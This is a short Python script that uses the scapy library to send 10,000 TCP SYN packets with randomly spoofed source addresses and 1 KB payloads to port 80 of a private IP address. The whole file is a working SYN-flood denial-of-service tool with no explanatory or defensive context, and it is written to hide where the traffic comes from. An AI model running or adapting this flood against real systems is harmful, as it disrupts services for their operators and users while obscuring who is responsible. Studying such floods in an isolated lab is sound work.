from scapy.all import *
from scapy.layers.inet import IP, TCP

numPACK = 10000
dstIP = "192.168.245.3"
dstPORT = 80

for i in range(numPACK):
    packet = IP(src=str(RandIP()), dst=dstIP) / TCP(dport=dstPORT, flags="S") / Raw(b"X"*1024)
    send(packet, verbose=0)
